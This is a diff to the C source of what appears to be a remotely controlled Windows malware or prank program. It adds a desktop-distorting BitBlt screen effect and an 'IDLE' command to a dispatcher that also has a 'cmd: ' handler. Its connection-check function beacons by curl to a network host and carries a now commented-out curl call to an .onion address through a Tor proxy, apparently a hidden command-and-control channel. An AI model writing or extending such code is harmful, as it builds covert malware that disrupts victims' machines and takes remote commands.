@@ -326,9 +326,24 @@ void squaryshapez() {
     Sleep(1);
 }
 
+void idlefx() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+    HDC hdc = GetDC(NULL);
+
+    static int counter = 0;
+    counter = counter + 1;
+
+    if (counter >= h) {counter = 0;} // resetta il counter se supera lo schermo in larghezza
+
+    BitBlt(hdc, counter, 5, w, 5, hdc, counter, 0, SRCCOPY);
+    ReleaseDC(NULL, hdc);
+    Sleep(1);
+}
+
 void checkconn() {
     system("curl -s http://192.168.122.1:80/yesimok");
-    popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r");
+    // system("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r");
 }
 
 void startfx() {
@@ -542,6 +557,10 @@ int main() {
 
         else if (strcmp(reqtextbuffer, "CHOOSE") == 0) {
             wrongchoose();
+        }
+
+        else if (strcmp(reqtextbuffer, "IDLE") == 0) {
+            idlefx();
         }
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
